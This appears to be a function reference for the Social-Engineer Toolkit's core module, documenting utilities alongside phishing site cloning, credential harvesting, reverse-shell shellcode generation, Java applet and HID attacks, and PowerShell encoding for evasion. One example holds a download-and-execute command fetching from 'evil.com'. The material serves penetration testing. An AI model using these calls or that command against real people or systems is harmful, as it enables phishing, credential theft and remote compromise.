# SET Function Reference Guide

## Core Functions (`src/core/setcore.py`)

### System and Environment Functions

#### `check_os()`
**Signature**: `def check_os() -> str`
**Description**: Detects the operating system
**Returns**: 
- `"posix"` for Unix-like systems (Linux, macOS)
- `"windows"` for Windows systems
**Usage**: Used throughout SET to determine OS-specific behavior
**Example**:
```python
if check_os() == "posix":
    # Unix-specific code
    pass
else:
    # Windows-specific code
    pass
```

#### `definepath()`
**Signature**: `def definepath() -> str`
**Description**: Determines the main SET installation path
**Returns**: String path to SET installation directory
**Logic**:
- On POSIX: Returns current directory if `setoolkit` file exists, otherwise `/usr/local/share/setoolkit/`
- On Windows: Returns current working directory
**Example**:
```python
set_path = definepath()
config_path = os.path.join(set_path, "src/core/config.baseline")
```

### User Interface Functions

#### `setprompt(category, text)`
**Signature**: `def setprompt(category: Union[List, str], text: str) -> str`
**Description**: Creates standardized prompts for user input
**Parameters**:
- `category`: List or string indicating menu category/level
- `text`: Prompt text to display
**Returns**: Formatted prompt string
**Format**: `"set:category> text: "`
**Example**:
```python
# Single category
prompt = setprompt("1", "Enter your choice")
# Output: "set:1> Enter your choice: "

# Multiple categories  
prompt = setprompt(["2", "3"], "Select payload")
# Output: "set:2:3> Select payload: "
```

#### `yesno_prompt(category, text)`
**Signature**: `def yesno_prompt(category: str, text: str) -> str`
**Description**: Creates yes/no prompts with input validation
**Parameters**:
- `category`: Menu category identifier
- `text`: Question text
**Returns**: `"YES"` or `"NO"` (uppercase)
**Validation**: Accepts y/yes/n/no (case insensitive)
**Example**:
```python
response = yesno_prompt("0", "Continue with attack [yes|no]")
if response == "YES":
    proceed_with_attack()
```

#### `return_continue()`
**Signature**: `def return_continue() -> None`
**Description**: Pauses execution and waits for user to press Enter
**Usage**: Used to pause output display for user review
**Example**:
```python
print_error("An error occurred")
return_continue()  # Waits for Enter key
```

### Output and Logging Functions

#### `print_status(message)`
**Signature**: `def print_status(message: str) -> None`
**Description**: Prints status messages with blue formatting
**Format**: `[*] message`
**Example**:
```python
print_status("Starting web server...")
# Output: [*] Starting web server...
```

#### `print_info(message)`
**Signature**: `def print_info(message: str) -> None`
**Description**: Prints informational messages
**Format**: `[*] message`
**Example**:
```python
print_info("Credential harvester will capture login attempts")
```

#### `print_info_spaces(message)`
**Signature**: `def print_info_spaces(message: str) -> None`
**Description**: Prints informational messages with leading spaces
**Format**: `    [*] message`
**Usage**: Used for indented sub-information
**Example**:
```python
print_info("Available options:")
print_info_spaces("1. Java Applet Attack")
print_info_spaces("2. Browser Exploit")
```

#### `print_warning(message)`
**Signature**: `def print_warning(message: str) -> None`
**Description**: Prints warning messages in yellow
**Format**: `[!] message`
**Example**:
```python
print_warning("This feature requires root privileges")
# Output: [!] This feature requires root privileges
```

#### `print_error(message)`
**Signature**: `def print_error(message: str) -> None`
**Description**: Prints error messages in red
**Format**: `[!] message`
**Example**:
```python
print_error("Failed to connect to target server")
# Output: [!] Failed to connect to target server
```

#### `log(error)`
**Signature**: `def log(error: Exception) -> None`
**Description**: Logs errors to SET's log file
**Parameters**: `error` - Exception object to log
**Log Location**: `src/logs/set_logfile.log`
**Example**:
```python
try:
    risky_operation()
except Exception as e:
    log(e)
    print_error(f"Operation failed: {str(e)}")
```

### Network Functions

#### `detect_public_ip()`
**Signature**: `def detect_public_ip() -> str`
**Description**: Detects the public IP address of the system
**Method**: Makes HTTP request to external service
**Returns**: Public IP address as string
**Fallback**: Returns local IP if public detection fails
**Example**:
```python
public_ip = detect_public_ip()
update_options(f"IPADDR={public_ip}")
```

#### `validate_ip(address)`
**Signature**: `def validate_ip(address: str) -> bool`
**Description**: Validates IP address format (IPv4 or IPv6)
**Parameters**: `address` - IP address string to validate
**Returns**: `True` if valid IP address, `False` otherwise
**Example**:
```python
if validate_ip("192.168.1.1"):
    print("Valid IP address")
else:
    print("Invalid IP address")
```

#### `is_valid_ipv4(ip)`
**Signature**: `def is_valid_ipv4(ip: str) -> bool`
**Description**: Validates IPv4 address format
**Parameters**: `ip` - IPv4 address string
**Returns**: `True` if valid IPv4, `False` otherwise
**Validation**: Checks format and range (0-255 for each octet)
**Example**:
```python
if is_valid_ipv4("192.168.1.300"):  # False - invalid range
    configure_ipv4(ip)
```

#### `is_valid_ipv6(ip)`
**Signature**: `def is_valid_ipv6(ip: str) -> bool`
**Description**: Validates IPv6 address format
**Parameters**: `ip` - IPv6 address string
**Returns**: `True` if valid IPv6, `False` otherwise
**Example**:
```python
if is_valid_ipv6("2001:0db8:85a3:0000:0000:8a2e:0370:7334"):
    configure_ipv6(ip)
```

#### `grab_ipaddress()`
**Signature**: `def grab_ipaddress() -> str`
**Description**: Interactively prompts user for IP address with validation
**Returns**: Validated IP address string
**Validation**: Continues prompting until valid IP is entered
**Example**:
```python
# Prompts user and validates input
ip_address = grab_ipaddress()
```

### File and Directory Operations

#### `copyfolder(sourcePath, destPath)`
**Signature**: `def copyfolder(sourcePath: str, destPath: str) -> None`
**Description**: Recursively copies folders and files
**Parameters**:
- `sourcePath` - Source directory path
- `destPath` - Destination directory path
**Behavior**: Creates destination directory if it doesn't exist
**Example**:
```python
# Copy website template to working directory
copyfolder("/templates/banking", "/tmp/cloned_site")
```

#### `setdir()`
**Signature**: `def setdir() -> str`
**Description**: Returns the user's SET configuration directory
**Returns**: Path to `~/.set` directory
**Usage**: Used for storing user-specific SET data
**Example**:
```python
user_config = setdir()
reports_path = os.path.join(user_config, "reports")
```

### Configuration Management

#### `check_config(param)`
**Signature**: `def check_config(param: str) -> str`
**Description**: Retrieves configuration parameter value
**Parameters**: `param` - Configuration parameter name (with = suffix)
**Returns**: Parameter value or "0" if not found
**Config File**: `/etc/setoolkit/set.config`
**Example**:
```python
# Check if auto-detect is enabled
auto_detect = check_config("AUTO_DETECT=")
if auto_detect == "ON":
    ip = detect_public_ip()
```

#### `update_options(option)`
**Signature**: `def update_options(option: str) -> None`
**Description**: Updates configuration options in SET
**Parameters**: `option` - Configuration in "KEY=VALUE" format
**Storage**: Updates both config file and runtime options
**Example**:
```python
# Set IP address for attacks
update_options("IPADDR=192.168.1.100")

# Enable Apache server
update_options("APACHE_SERVER=ON")
```

#### `check_options(option)`
**Signature**: `def check_options(option: str) -> str`
**Description**: Checks runtime configuration options
**Parameters**: `option` - Option name to check
**Returns**: Option value or "0" if not set
**Example**:
```python
current_ip = check_options("IPADDR=")
if current_ip != "0":
    print(f"Using IP: {current_ip}")
```

### Web Server Functions

#### `start_web_server(directory)`
**Signature**: `def start_web_server(directory: str) -> None`
**Description**: Starts a threaded web server
**Parameters**: `directory` - Directory to serve files from
**Port**: Uses configured WEBATTACK_PORT (default 80)
**Threading**: Runs in separate thread for non-blocking operation
**Example**:
```python
# Serve cloned website
start_web_server("/tmp/cloned_site")
```

#### `start_web_server_unthreaded(directory)`
**Signature**: `def start_web_server_unthreaded(directory: str) -> None`
**Description**: Starts web server in main thread (blocking)
**Parameters**: `directory` - Directory to serve files from
**Usage**: Used when main thread needs to handle web requests
**Example**:
```python
# Blocking web server for credential harvesting
start_web_server_unthreaded("/tmp/harvester_site")
```

### Payload and Exploit Functions

#### `generate_shellcode(payload, ipaddr, port)`
**Signature**: `def generate_shellcode(payload: str, ipaddr: str, port: str) -> str`
**Description**: Generates shellcode for specified payload
**Parameters**:
- `payload` - Payload type identifier
- `ipaddr` - IP address for reverse connection
- `port` - Port for reverse connection
**Returns**: Generated shellcode as string
**Integration**: Uses Metasploit's msfvenom
**Example**:
```python
shellcode = generate_shellcode("windows/meterpreter/reverse_tcp", 
                              "192.168.1.100", "4444")
```

#### `metasploit_shellcode(payload, ipaddr, port)`
**Signature**: `def metasploit_shellcode(payload: str, ipaddr: str, port: str) -> str`
**Description**: Generates Metasploit-compatible shellcode
**Parameters**:
- `payload` - Metasploit payload name
- `ipaddr` - LHOST parameter
- `port` - LPORT parameter
**Returns**: Metasploit shellcode
**Format**: Raw shellcode bytes
**Example**:
```python
msf_shellcode = metasploit_shellcode("windows/shell/reverse_tcp",
                                    "10.0.0.1", "443")
```

#### `generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2)`
**Signature**: `def generate_powershell_alphanumeric_payload(payload: str, ipaddr: str, port: str, payload2: str) -> str`
**Description**: Creates alphanumeric PowerShell payload
**Parameters**:
- `payload` - Primary payload type
- `ipaddr` - Listener IP address
- `port` - Listener port
- `payload2` - Secondary payload type
**Returns**: Encoded PowerShell command
**Encoding**: Base64 + alphanumeric encoding for evasion
**Example**:
```python
ps_payload = generate_powershell_alphanumeric_payload(
    "windows/meterpreter/reverse_tcp", "192.168.1.100", "8080", "encoded"
)
```

### Utility Functions

#### `generate_random_string(low, high)`
**Signature**: `def generate_random_string(low: int, high: int) -> str`
**Description**: Generates random alphanumeric string
**Parameters**:
- `low` - Minimum length
- `high` - Maximum length
**Returns**: Random string of length between low and high
**Characters**: Letters and numbers only
**Example**:
```python
# Generate random filename
random_name = generate_random_string(8, 12)
filename = f"update_{random_name}.exe"
```

#### `site_cloner(website, exportpath, *args)`
**Signature**: `def site_cloner(website: str, exportpath: str, *args) -> None`
**Description**: Clones websites for phishing attacks
**Parameters**:
- `website` - URL of website to clone
- `exportpath` - Path to save cloned files
- `*args` - Additional arguments (optional)
**Features**:
- Downloads HTML, CSS, JavaScript, images
- Modifies forms for credential capture
- Handles relative/absolute URLs
**Example**:
```python
# Clone login page
site_cloner("https://login.company.com", "/tmp/phishing_site")
```

#### `java_applet_attack(website, port, directory)`
**Signature**: `def java_applet_attack(website: str, port: str, directory: str) -> None`
**Description**: Launches Java applet attack
**Parameters**:
- `website` - Target website URL
- `port` - Port for web server
- `directory` - Directory containing attack files
**Process**:
1. Clones target website
2. Injects malicious Java applet
3. Signs applet with fake certificate
4. Starts web server
**Example**:
```python
java_applet_attack("https://portal.company.com", "80", "/tmp/java_attack")
```

#### `teensy_pde_generator(attack_method)`
**Signature**: `def teensy_pde_generator(attack_method: str) -> None`
**Description**: Generates Arduino/Teensy code for HID attacks
**Parameters**: `attack_method` - Type of HID attack to generate
**Output**: Creates .ino file for Arduino IDE
**Attack Types**:
- Powershell download and execute
- Reverse shell establishment
- System enumeration
- Credential harvesting
**Example**:
```python
# Generate powershell attack code
teensy_pde_generator("powershell_reverse")
```

### Process and System Management

#### `kill_proc(port, flag)`
**Signature**: `def kill_proc(port: str, flag: str) -> None`
**Description**: Kills processes using specified port
**Parameters**:
- `port` - Port number to check
- `flag` - Process name/type to kill
**Usage**: Cleanup routine to stop conflicting services
**Example**:
```python
# Kill any Python processes using port 80
kill_proc("80", "python")

# Kill Ruby processes on port 443
kill_proc("443", "ruby")
```

#### `cleanup_routine()`
**Signature**: `def cleanup_routine() -> None`
**Description**: Performs cleanup operations on SET exit
**Actions**:
- Removes temporary files
- Stops running web servers
- Cleans user configuration directory
- Terminates background processes
**Example**:
```python
# Automatically called on SET exit
try:
    main_program()
finally:
    cleanup_routine()
```

### Encryption and Security Functions

#### `encryptAES(secret, data)`
**Signature**: `def encryptAES(secret: str, data: str) -> str`
**Description**: Encrypts data using AES encryption
**Parameters**:
- `secret` - Encryption key/password
- `data` - Data to encrypt
**Returns**: Base64-encoded encrypted data
**Requirements**: pycrypto library
**Example**:
```python
encrypted = encryptAES("mypassword", "sensitive data")
```

#### `powershell_encodedcommand(ps_attack)`
**Signature**: `def powershell_encodedcommand(ps_attack: str) -> str`
**Description**: Encodes PowerShell commands for execution
**Parameters**: `ps_attack` - PowerShell command to encode
**Returns**: Base64-encoded command for -EncodedCommand parameter
**Usage**: Bypasses command-line logging and some security tools
**Example**:
```python
encoded_cmd = powershell_encodedcommand("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')")
# Execute with: powershell -EncodedCommand <encoded_cmd>
```

### Menu and Interface Functions

#### `create_menu(text, menu_items)`
**Signature**: `def create_menu(text: str, menu_items: List[str]) -> None`
**Description**: Creates and displays formatted menus
**Parameters**:
- `text` - Menu description/header text
- `menu_items` - List of menu options
**Display**: Numbers each menu item automatically
**Example**:
```python
from src.core.menu.text import main_text, main_menu
create_menu(main_text, main_menu)
# Displays:
# Select from the menu:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# ...
```

#### `show_banner(define_version, graphic)`
**Signature**: `def show_banner(define_version: str, graphic: str) -> None`
**Description**: Displays SET banner with version information
**Parameters**:
- `define_version` - SET version string
- `graphic` - Graphic style identifier
**Example**:
```python
version = get_version()
show_banner(version, '1')
```

### Version and Information Functions

#### `get_version()`
**Signature**: `def get_version() -> str`
**Description**: Returns current SET version
**Source**: Reads from `src/core/set.version` file
**Returns**: Version string (e.g., "8.0.3")
**Example**:
```python
current_version = get_version()
print(f"SET Version: {current_version}")
```

#### `date_time()`
**Signature**: `def date_time() -> str`
**Description**: Returns current date and time
**Format**: "YYYY-MM-DD HH:MM:SS"
**Usage**: Logging and timestamping operations
**Example**:
```python
timestamp = date_time()
log_entry = f"[{timestamp}] Attack started"
```

### Network Utility Functions

#### `socket_listener(port)`
**Signature**: `def socket_listener(port: str) -> socket.socket`
**Description**: Creates a socket listener on specified port
**Parameters**: `port` - Port number to listen on
**Returns**: Socket object ready for connections
**Usage**: Custom payload handlers and reverse shells
**Example**:
```python
listener = socket_listener("4444")
conn, addr = listener.accept()
print(f"Connection from {addr}")
```

#### `check_ports(filename, port)`
**Signature**: `def check_ports(filename: str, port: str) -> bool`
**Description**: Checks if port is available for use
**Parameters**:
- `filename` - Log filename for results
- `port` - Port number to check
**Returns**: `True` if port is available, `False` if in use
**Example**:
```python
if check_ports("port_check.log", "80"):
    start_web_server("/var/www/html")
else:
    print_error("Port 80 is already in use")
```

### Binary and Data Conversion Functions

#### `ip2bin(ip)`
**Signature**: `def ip2bin(ip: str) -> str`
**Description**: Converts IP address to binary representation
**Parameters**: `ip` - IPv4 address string
**Returns**: 32-bit binary string
**Example**:
```python
binary_ip = ip2bin("192.168.1.1")
# Returns: "11000000101010000000000100000001"
```

#### `bin2ip(b)`
**Signature**: `def bin2ip(b: str) -> str`
**Description**: Converts binary string to IP address
**Parameters**: `b` - 32-bit binary string
**Returns**: IPv4 address string
**Example**:
```python
ip_address = bin2ip("11000000101010000000000100000001")
# Returns: "192.168.1.1"
```

#### `dec2bin(n, d=None)`
**Signature**: `def dec2bin(n: int, d: int = None) -> str`
**Description**: Converts decimal to binary with optional padding
**Parameters**:
- `n` - Decimal number to convert
- `d` - Desired binary string length (optional)
**Returns**: Binary string representation
**Example**:
```python
binary = dec2bin(10, 8)  # Returns: "00001010"
```

### CIDR and Network Functions

#### `printCIDR(c)`
**Signature**: `def printCIDR(c: str) -> List[str]`
**Description**: Expands CIDR notation to list of IP addresses
**Parameters**: `c` - CIDR notation (e.g., "192.168.1.0/24")
**Returns**: List of IP addresses in the range
**Example**:
```python
ip_list = printCIDR("192.168.1.0/30")
# Returns: ["192.168.1.0", "192.168.1.1", "192.168.1.2", "192.168.1.3"]
```

#### `validateCIDRBlock(b)`
**Signature**: `def validateCIDRBlock(b: str) -> bool`
**Description**: Validates CIDR block notation
**Parameters**: `b` - CIDR block string to validate
**Returns**: `True` if valid CIDR block, `False` otherwise
**Example**:
```python
if validateCIDRBlock("192.168.1.0/24"):
    process_network_range(b)
```

### Database and Service Functions

#### `get_sql_port(host)`
**Signature**: `def get_sql_port(host: str) -> str`
**Description**: Detects SQL server port on target host
**Parameters**: `host` - Target hostname or IP address
**Returns**: Port number as string, or "0" if not found
**Detection**: Scans common SQL ports (1433, 3306, 5432, etc.)
**Example**:
```python
sql_port = get_sql_port("database.company.com")
if sql_port != "0":
    print(f"SQL server found on port {sql_port}")
```

### Platform Detection Functions

#### `check_backbox()`
**Signature**: `def check_backbox() -> bool`
**Description**: Detects if running on BackBox Linux
**Returns**: `True` if BackBox Linux detected, `False` otherwise
**Usage**: Platform-specific optimizations and configurations
**Example**:
```python
if check_backbox():
    print("BackBox Linux detected - using optimized settings")
```

#### `check_kali()`
**Signature**: `def check_kali() -> bool`
**Description**: Detects if running on Kali Linux
**Returns**: `True` if Kali Linux detected, `False` otherwise
**Usage**: Kali-specific tool paths and configurations
**Example**:
```python
if check_kali():
    metasploit_path = "/usr/share/metasploit-framework"
```

### Module Management Functions

#### `module_reload(module)`
**Signature**: `def module_reload(module: object) -> None`
**Description**: Reloads Python module for development
**Parameters**: `module` - Module object to reload
**Usage**: Development and debugging - refreshes module code
**Example**:
```python
try:
    module_reload(attack_module)
except:
    import attack_module
```

#### `mod_name()`
**Signature**: `def mod_name() -> str`
**Description**: Returns current module name for debugging
**Returns**: Name of calling module
**Usage**: Debug logging and error tracking
**Example**:
```python
current_module = mod_name()
debug_msg(current_module, "Starting attack sequence", 1)
```

### File Processing Functions

#### `tail(filename)`
**Signature**: `def tail(filename: str) -> str`
**Description**: Returns last line of specified file
**Parameters**: `filename` - Path to file to read
**Returns**: Last line of file as string
**Usage**: Monitoring log files and status files
**Example**:
```python
last_log_entry = tail("/var/log/set.log")
print(f"Latest: {last_log_entry}")
```

#### `fetch_template()`
**Signature**: `def fetch_template() -> str`
**Description**: Retrieves email template for phishing attacks
**Returns**: Template content as string
**Source**: Reads from predefined template files
**Usage**: Mass mailer and spear-phishing attacks
**Example**:
```python
email_template = fetch_template()
customized_email = email_template.replace("[TARGET]", victim_name)
```

---

*This function reference provides detailed information about SET's core functionality. Use these functions as building blocks for custom attacks and extensions.*